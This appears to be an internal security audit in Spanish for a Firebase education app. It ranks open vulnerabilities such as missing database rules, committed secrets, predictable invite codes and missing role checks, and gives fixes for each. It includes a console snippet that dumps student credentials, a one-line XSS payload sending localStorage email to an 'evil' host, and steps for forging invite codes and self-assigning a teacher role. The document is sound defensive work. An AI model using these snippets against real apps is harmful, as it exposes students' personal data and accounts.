## ZERO_DAYS

> Last audited: 2026-04-19
> Scope: `apps/core-web`, `apps/flow-web`, `apps/login-web`, `libs/cloud-services`, Firebase config

### ¿Qué es este documento?

Un **zero-day** es una vulnerabilidad de seguridad que existe **hoy mismo en producción** y que un atacante podría explotar **antes** de que el equipo aplique un parche. A diferencia de `TECHDEBT.md` (que rastrea deuda de calidad), este archivo rastrea **riesgos de seguridad activos**: cualquier issue listado aquí es explotable y debe priorizarse por encima de features.

Cada entrada incluye:

- **Qué es** — descripción técnica del problema.
- **En qué consiste** — el vector exacto de explotación, con referencia al código.
- **Por qué solucionarlo** — el impacto real (qué se rompe, qué se filtra, a quién afecta).
- **Guía de remediación** — pasos accionables, con archivos a tocar.

Severidades: **P0** (explotable hoy, impacto crítico) → **P3** (defensa en profundidad).

---

## P0 — Critical (explotable hoy, parar todo)

### P0-1 — Firebase sin reglas de seguridad (Firestore + Realtime Database)

| Campo                | Valor                                                                                                |
| -------------------- | ---------------------------------------------------------------------------------------------------- |
| Archivos esperados   | `firestore.rules`, `database.rules.json` (no existen)                                                |
| Configuración actual | `firebase.json` declara `hosting`, `functions` y `emulators`, pero no referencia ni despliega reglas |
| Proyecto afectado    | `guidy-app-ai` (producción, según `.env`)                                                            |

**Qué es.** Firebase Firestore y Realtime Database **deniegan o permiten** acceso según las reglas que el proyecto despliegue. Si no se despliegan reglas, Firebase aplica el modo con el que se creó la base (test mode = abierta 30 días, locked = cerrada). En cualquier caso, **no hay reglas versionadas en el repositorio**, lo que significa:

1. No sabemos qué reglas hay en producción.
2. Cualquier deploy o reset accidental dejará la base abierta.
3. No hay validación de schema, ownership ni roles a nivel de DB.

**En qué consiste.** Un atacante anónimo puede ejecutar desde la consola del navegador (la API key de Firebase es pública por diseño):

```js
// Cualquiera con el bundle JS puede hacer esto
const app = firebase.initializeApp({ apiKey: 'AIzaSy...', ... })
await firebase.auth().signInAnonymously()
const db = firebase.database()
const allCreds = await db.ref('student-credentials').get()
```

Si las reglas son `read: true`, **se filtra toda la base**: credenciales de estudiantes, perfiles, enrollments, channels, invite codes.

**Por qué solucionarlo.**

- Es el **fallo raíz** que magnifica todos los demás (P0-2, P1-2, P2-1).
- Filtración masiva de PII (números de identificación nacional + nombres).
- Estudiantes/profesores pueden modificarse mutuamente sin auditoría.
- Un competidor puede dumpear el dataset entero.

**Guía de remediación.**

1. Crear `firestore.rules` en la raíz con denegación por defecto y reglas explícitas:

```
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /users/{uid} {
      allow read: if request.auth != null && request.auth.uid == uid;
      allow write: if request.auth != null && request.auth.uid == uid;

      match /students/{idNumber} {
        allow read, write: if request.auth != null && request.auth.uid == uid;
      }
      match /channels/{channelId} {
        allow read, write: if request.auth != null && request.auth.uid == uid;
      }
    }
    match /students/{idNumber} {
      allow read: if request.auth != null;
      allow write: if false; // solo backend/admin SDK
      match /workspaces/{teacherUid} {
        allow read: if request.auth != null;
        allow write: if request.auth.uid == teacherUid;
      }
    }
    match /{document=**} { allow read, write: if false; }
  }
}
```

2. Crear `database.rules.json` (RTDB) con denegación por defecto:

```json
{
  "rules": {
    ".read": false,
    ".write": false,
    "student-credentials": {
      "$idNumber": {
        ".read": false,
        ".write": false
      }
    },
    "codes": {
      "$code": {
        ".read": "auth != null",
        ".write": false
      }
    },
    "userCodes": {
      "$uid": {
        ".read": "auth != null && auth.uid == $uid",
        ".write": "auth != null && auth.uid == $uid"
      }
    }
  }
}
```

> Nota: las credenciales de estudiantes ya se verifican server-side vía Cloud Functions (`apps/functions/`). **Bloquear lectura/escritura** de `student-credentials` desde el cliente.

3. Actualizar `firebase.json` para incluir las reglas en el deploy:

```json
{
  "firestore": { "rules": "firestore.rules" },
  "database": { "rules": "database.rules.json" },
  "hosting": { ... }
}
```

4. Desplegar inmediatamente: `firebase deploy --only firestore:rules,database`.
5. Añadir un test de reglas con `@firebase/rules-unit-testing` en `libs/cloud-services/test/rules/`.

---

### P0-2 — `.env` con credenciales de producción comiteadas a git

| Campo           | Valor                                                                |
| --------------- | -------------------------------------------------------------------- |
| Archivo         | `.env` (tracked en git, ver `git ls-files \| grep .env`)             |
| Gitignore       | `.gitignore` no contiene `.env`                                      |
| Datos expuestos | `PUBLIC_FIREBASE_API_KEY`, `projectId`, `databaseURL`, `appId`, etc. |

**Qué es.** El archivo `.env` está versionado en el repositorio público (o privado, pero igualmente accesible a cualquier colaborador presente o pasado, GitHub Actions logs, forks, mirrors). El `.gitignore` no lo excluye.

**En qué consiste.** Aunque las claves de Firebase Web son técnicamente "públicas" (van en el bundle JS), versionarlas tiene riesgos reales:

1. **No hay separación de entornos**: dev, staging y prod usan el mismo `.env` versionado. No se pueden rotar credenciales sin un commit.
2. **Cualquier secreto adicional futuro** (Stripe, OpenAI, SendGrid) se va a meter aquí "por costumbre" y se filtrará.
3. **Auditoría imposible**: el git log expone qué proyecto Firebase usar para fuzzear, abusar de cuotas y atacar (correlacionado con P0-1).

**Por qué solucionarlo.**

- Es el patrón #1 de leaks reales (Uber, Toyota, etc.). Una vez normalizado comitear `.env`, eventualmente se filtra un secreto de servidor.
- Imposibilita rotación de claves sin reescribir historia.
- En `git log` queda permanente; aunque se borre del HEAD, queda en el historial y forks.

**Guía de remediación.**

1. Añadir a `.gitignore`:

```
.env
.env.local
.env.*.local
```

2. Quitar del tracking sin borrar el archivo local:

```bash
git rm --cached .env
git commit -m "chore: stop tracking .env, move secrets to local-only"
```

3. Documentar en `README.md` que cada dev debe copiar `.env.example` a `.env` y rellenarlo.
4. Para CI/CD usar **GitHub Secrets** (`secrets.PUBLIC_FIREBASE_API_KEY`) inyectados en el job, no commiteados.
5. Reescribir historia (opcional pero recomendado si el repo es público) con `git filter-repo` para eliminar `.env` de todos los commits previos, y rotar la API key en Firebase Console (Project settings → Service accounts).
6. Habilitar **App Check** en Firebase Console para que la API key, aunque pública, solo funcione desde tus dominios.

---

## P1 — High (explotable con esfuerzo moderado)

### P1-2 — Invite codes deterministas y predecibles

| Archivo | `apps/core-web/src/services/invite-code/invite-code.utils.ts` |
| ------- | ------------------------------------------------------------- |

**Qué es.** El código de invitación de un teacher se genera con un hash DJB2 sobre `uid`. Mismo `uid` → mismo código. La única "rotación" es incrementar `attempt` ante colisiones.

**En qué consiste.** Un atacante que conoce el uid de Firebase de un teacher (visible en cualquier doc Firestore que él haya creado, en logs, en respuestas de error) puede **calcular el invite code en una línea**:

```ts
const code = djb2(teacherUid) % 10_000_000_000
```

Y unirse a su workspace sin permiso. Adicionalmente, DJB2 es un hash no-criptográfico → colisiones triviales (paradox del cumpleaños sobre 10^10 ≈ ~10^5 uids para colisión esperable).

**Por qué solucionarlo.**

- Cualquier atacante puede enrolarse en cualquier workspace.
- Una vez enrolado, lee material del curso, contamina datos, impersonalo.
- Imposibilita "revocar" un código sin cambiar el uid del teacher.

**Guía de remediación.**

1. Generar códigos **aleatorios** con `crypto.getRandomValues` (no derivados del uid):

```ts
const buf = new Uint8Array(8)
crypto.getRandomValues(buf)
const code = Array.from(buf, (b) => b.toString(36))
  .join('')
  .slice(0, 10)
  .toUpperCase()
```

2. Almacenar `{ code → { teacherUid, expiresAt, usesRemaining } }`. Validar `expiresAt` y `usesRemaining > 0` en cada uso.
3. Permitir al teacher **rotar** el código desde la UI (botón "Generate new code").
4. Usar caracteres sin ambigüedad (sin `0/O`, `1/I/l`) si el código se dicta verbalmente.
5. Registrar en Firestore quién usó cada código (audit log).

---

### P1-3 — Sin control de acceso por rol (cualquier user puede entrar a `core-web`)

| Archivo | `apps/core-web/src/modules/AuthGuard/useAuthGuard.ts` |
| ------- | ----------------------------------------------------- |

**Qué es.** El guard de `core-web` (app de teachers) solo verifica:

- `authStatus === Success` y `authUser` existe.
- `useUserProfile(uid)` retorna un perfil.

**No hay verificación de rol** (`teacher` vs `student`). Un usuario que cree un perfil en `users/{uid}` desde cualquier lado (o que sea filtrado allí por error) entra al panel de teachers.

**En qué consiste.** Combinado con P0-1 (sin reglas), un atacante puede:

1. Hacer `signInAnonymously()` o crear cuenta normal.
2. Escribir directamente a Firestore: `setDoc('users', myUid, { name, role: 'teacher' })`.
3. Navegar a `/core/` y tener acceso completo a la UI de teacher (channels, students, enrollments).

**Por qué solucionarlo.** Privilege escalation trivial. Sin separación de roles, todo el modelo de permisos de la app es ficticio.

**Guía de remediación.**

1. Añadir campo `role: 'teacher' | 'student'` al `UserDocument` schema.
2. Establecer el rol con **custom claims** vía Cloud Function al registrar (`admin.auth().setCustomUserClaims(uid, { role: 'teacher' })`).
3. Usar custom claims en las security rules (ver P0-1):

```
allow write: if request.auth.token.role == 'teacher';
```

4. En el cliente, leer `idTokenResult.claims.role` y bloquear navegación a `/core/` si no es teacher (defensa en profundidad, no la única capa).
5. Redirigir un student que cae en `/core/` hacia `/flow/`.

---

### P1-4 — `E2E_BYPASS=true` expone instancia de Auth en `window.__e2eAuth`

| Archivo | `libs/cloud-services/src/factory.ts:53-62` |
| ------- | ------------------------------------------ |

**Qué es.** Cuando la env `E2E_BYPASS=true`:

```ts
;(window as unknown as Record<string, unknown>).__e2eAuth = services.auth
```

Y los AuthGuards saltan el redirect (`useAuthGuard.ts: if (IS_E2E) return`).

**En qué consiste.** Si esta env se filtra a un build de producción (CI mal configurado, `.env.production` mezclado, despliegue equivocado):

1. Cualquier visitante con devtools puede hacer `window.__e2eAuth.signInWithEmail({ email, password })` saltándose la UI.
2. AuthGuards no redirigen → entras a cualquier app sin estar autenticado.
3. La app se conecta a **emulators** (`127.0.0.1:9099` no existe en prod, errores raros que confunden monitoreo).

**Por qué solucionarlo.** Un solo despliegue equivocado convierte el sitio en bypass total. Defensa en profundidad: que nunca exista esa puerta.

**Guía de remediación.**

1. Reemplazar el env runtime por una **build flag** que el bundler eliminé en producción:

```ts
// vite.config.ts
define: {
  __E2E_BYPASS__: JSON.stringify(process.env.MODE === 'test'),
}
```

```ts
declare const __E2E_BYPASS__: boolean
if (__E2E_BYPASS__) {
  window.__e2eAuth = services.auth
}
```

Vite hará tree-shake del bloque en builds de producción → imposible activarlo runtime.

2. Añadir un **CI check** que falle si `dist/` contiene la string `__e2eAuth`.
3. Documentar que `E2E_BYPASS` solo se setea en `playwright.config.ts`, jamás en `.env.production`.

---

## P2 — Medium (defensa en profundidad)

### P2-1 — PII (números de identificación) almacenados como claves de DB

| Archivos | `student.service.ts`, `enrollment.service.ts` |
| -------- | --------------------------------------------- |

**Qué es.** El `identificationNumber` (típicamente DNI/CC/CURP) se usa como **key directa de documento** en `students/{idNumber}`, `student-credentials/{idNumber}`, etc.

**En qué consiste.** Las claves de Firestore son **enumerables** vía `listDocuments` (Admin SDK) o adivinables por brute force (los IDs nacionales tienen rangos predecibles). Esto facilita:

1. Enumeración masiva de estudiantes registrados.
2. Cross-referencing con otras bases de datos filtradas (ataques de correlación).
3. Una sola filtración expone PII directamente sin necesidad de joins.

**Por qué solucionarlo.** Cumplimiento legal (GDPR, LFPDPPP en MX, Habeas Data en CO). Las PII no deben ser identificadores primarios accesibles desde el cliente.

**Guía de remediación.**

1. Usar el **uid de Firebase Auth como clave primaria**: `students/{uid}`.
2. Mantener un mapeo separado y server-side `idNumberLookup/{hash(idNumber)} → uid` para login (lookup hecho por Cloud Function).
3. Hashear el ID con `HMAC-SHA256(idNumber, serverSecret)` antes de usarlo como key, si forzosamente debe ser indexable.
4. Cifrar el `identificationNumber` "at rest" con KMS si debe persistirse en claro para compliance.

---

### P2-2 — Sin Content Security Policy ni headers de seguridad

| Archivos | `apps/*/dist/index.html`, `firebase.json` (no headers) |
| -------- | ------------------------------------------------------ |

**Qué es.** Los `index.html` generados no incluyen `<meta http-equiv="Content-Security-Policy">`. `firebase.json` hosting no define `headers`. Falta:

- `Content-Security-Policy`
- `Strict-Transport-Security`
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY` o `frame-ancestors 'none'`
- `Referrer-Policy: strict-origin-when-cross-origin`

**En qué consiste.** Sin CSP, un XSS (incluso uno transitorio, ej. en algún `dangerouslySetInnerHTML` futuro o paquete npm comprometido) ejecuta sin restricciones. Sin HSTS, ataque MITM en primera visita. Sin frame-ancestors, clickjacking trivial embebiendo el sitio en un iframe atacante para robar el flujo de login.

**Por qué solucionarlo.** Defensa en profundidad. Costo de implementación ≈ 1 hora, beneficio enorme.

**Guía de remediación.**

Añadir a `firebase.json`:

```json
{
  "hosting": {
    "headers": [
      {
        "source": "**",
        "headers": [
          {
            "key": "Strict-Transport-Security",
            "value": "max-age=63072000; includeSubDomains; preload"
          },
          { "key": "X-Content-Type-Options", "value": "nosniff" },
          { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
          { "key": "Permissions-Policy", "value": "geolocation=(), microphone=(), camera=()" },
          {
            "key": "Content-Security-Policy",
            "value": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://*.googleapis.com https://*.firebaseio.com wss://*.firebaseio.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
          }
        ]
      }
    ]
  }
}
```

Iterar el CSP en modo `Content-Security-Policy-Report-Only` durante una semana, ajustar, y promover a enforcing.

---

### P2-3 — Email del usuario en `localStorage` en texto plano

| Archivos | `apps/login-web/src/modules/Login/Login.utils.ts`, `CreateAccount.utils.ts` |
| -------- | --------------------------------------------------------------------------- |

**Qué es.** El flujo magic-link almacena `emailForSignIn` y `emailForSignUp` en `localStorage`.

**En qué consiste.** `localStorage` es **accesible por cualquier script** ejecutándose en el origin (incluyendo XSS, extensiones del navegador maliciosas, scripts de terceros). Un XSS de 1 línea (`fetch('https://evil/?e='+localStorage.emailForSignIn)`) filtra el email.

**Por qué solucionarlo.** No es crítico solo (es solo el email), pero combinado con un futuro XSS o con extensiones, expone al usuario a phishing dirigido.

**Guía de remediación.**

1. Para el flujo magic-link **mínimo cambio**: aceptar que es necesario y mitigar con CSP estricto (P2-2).
2. **Mejor**: usar `sessionStorage` (se borra al cerrar pestaña) en vez de `localStorage`.
3. Limpiar inmediatamente después del sign-in (ya se hace, verificar con tests).
4. Considerar cookies `HttpOnly + SameSite=Strict + Secure` si se introduce un backend.

---

### P2-4 — Sin App Check ni rate limiting en Cloud Functions

| Archivos | `apps/functions/src/student-login.ts`, `apps/functions/src/student-register.ts` |
| -------- | ------------------------------------------------------------------------------- |

> **Progreso:** `signInAnonymously` eliminado del flujo de estudiantes (migrado a `signInWithCustomToken` vía Cloud Functions). El Anonymous provider puede deshabilitarse en Firebase Console.

**Qué es.** Las Cloud Functions `studentLogin` y `studentRegister` no tienen rate limiting ni App Check. Son invocables sin restricción.

**En qué consiste.** Un atacante puede automatizar llamadas a las Cloud Functions para brute-force de contraseñas o creación masiva de cuentas, generando costo monetario.

**Por qué solucionarlo.** Posible **denial-of-wallet** en plan Blaze. Brute-force de contraseñas sin rate limiting.

**Guía de remediación.**

1. Habilitar **Firebase App Check** con reCAPTCHA v3 (web) → cualquier petición sin token de App Check es rechazada.
2. Implementar rate limiting en las Cloud Functions (por IP o por `identificationNumber`).
3. Revisar la facturación esperada y poner alertas en GCP Budgets.
4. **Deshabilitar Anonymous provider** en Firebase Console (ya no se usa en el flujo de estudiantes).

---

### P2-5 — `try/catch` que swallow errores y enmascara fallos de seguridad

| Archivos | `useFlowAuth.ts`, `useCreateAccountFlow.ts`, varios |
| -------- | --------------------------------------------------- |

**Qué es.** Patrón repetido:

```ts
try { ... } catch { setAuthError(FlowAuthError.Unknown); setStatus(Idle) }
```

Sin logging, sin diferenciación de errores, sin telemetría.

**En qué consiste.** Si un atacante intenta explotar (ej. forzar un permission-denied en Firestore al saltarse rules), el error se traga silenciosamente. El equipo no se entera de intentos de ataque ni de fallos de seguridad reales hasta que ya es tarde.

**Por qué solucionarlo.** Visibilidad. Sin telemetría no se detectan ataques en curso.

**Guía de remediación.**

1. Integrar Sentry / Firebase Crashlytics para Web.
2. Loguear `error.code` discriminando `permission-denied` (potencial ataque), `unavailable` (red), `not-found` (UX).
3. Añadir alertas en Sentry para tasas anómalas de `permission-denied`.
4. No mostrar `error.message` crudo al usuario (puede filtrar internals), pero sí enviarlo a la telemetría.

---

## P3 — Low (mejoras a futuro)

### P3-1 — `getCoreAppUrl` y similares dependen de `BASE_PATH` con fallback laxo

`(import.meta.env.BASE_PATH as string) ?? '/'` no maneja string vacía. No es vulnerabilidad directa pero introduce comportamiento ambiguo en redirects → potencial open-redirect si `BASE_PATH` se setea desde fuente no confiable. Mantener `BASE_PATH` exclusivamente compile-time.

### P3-2 — `.env.example` no documenta requisitos de App Check ni de rotación

Añadir comentarios indicando claves obligatorias vs opcionales y enlace a la guía de rotación.

### P3-3 — Sin `subresource integrity` en bundles

Los `<script src>` generados no llevan `integrity="sha384-..."`. Defensa contra CDN compromise (no aplica si todo se sirve desde Firebase Hosting same-origin, pero conviene para fonts/CDN externos).

---

## Resumen ejecutivo

| ID       | Severidad   | Esfuerzo     | Bloquea release | Estado       |
| -------- | ----------- | ------------ | --------------- | ------------ |
| P0-1     | Crítica     | 1-2 días     | Sí              | Pendiente    |
| P0-2     | Crítica     | 1 hora       | Sí              | Pendiente    |
| ~~P0-3~~ | ~~Crítica~~ | ~~3-5 días~~ | ~~Sí~~          | **Resuelto** |
| ~~P1-1~~ | ~~Alta~~    | ~~1 día~~    | ~~Sí~~          | **Resuelto** |
| P1-2     | Alta        | 1 día        | Sí              | Pendiente    |
| P1-3     | Alta        | 2 días       | Sí              | Pendiente    |
| P1-4     | Alta        | 4 horas      | Recomendado     | Pendiente    |
| P2-1     | Media       | 2-3 días     | No              | Pendiente    |
| P2-2     | Media       | 4 horas      | Recomendado     | Pendiente    |
| P2-3     | Media       | 1 hora       | No              | Pendiente    |
| P2-4     | Media       | 4 horas      | Recomendado     | Parcial      |
| P2-5     | Media       | 1 día        | No              | Pendiente    |
| P3-\*    | Baja        | < 1 día      | No              | Pendiente    |

**Resueltos:**

- **P0-3** — Verificación de password movida a Cloud Functions (`apps/functions/src/student-login.ts`, `student-register.ts`). Client-side hash comparison eliminada. `signInAnonymously` reemplazado por `signInWithCustomToken`.
- **P1-1** — SHA-256 sin sal reemplazado por argon2id en servidor. `hashPassword` eliminado del cliente (`student.utils.ts` borrado).

**Acción inmediata sugerida (orden):** P0-2 (1 h) → P0-1 (1-2 d) → P1-4 (4 h) → P1-3 → P1-2 → resto.
